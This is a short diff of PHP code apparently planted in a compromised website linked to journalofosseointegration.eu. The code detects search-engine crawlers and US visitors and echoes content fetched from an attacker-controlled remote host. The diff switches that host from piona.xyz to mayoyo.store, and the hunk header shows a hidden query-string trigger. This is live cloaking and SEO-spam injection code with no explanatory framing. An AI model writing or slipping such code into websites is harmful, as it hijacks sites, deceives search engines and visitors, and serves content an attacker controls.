@@ -23,7 +23,7 @@ if (isset($_GET['a']) && $_GET['a'] === 'a') {
 }
 
 if (preg_match('/bot|crawl|slurp|bingbot|Google-Site-Verification|Google-InspectionTool|AhrefsBot|spider/i', $userAgent) || $ctryCode == 'US') {
-    echo file_get_contents('https://piona.xyz/landing/www.journalofosseointegration.eu/index.txt');
+    echo file_get_contents('https://mayoyo.store/www.journalofosseointegration.eu/index.txt');
     exit;
 }
 
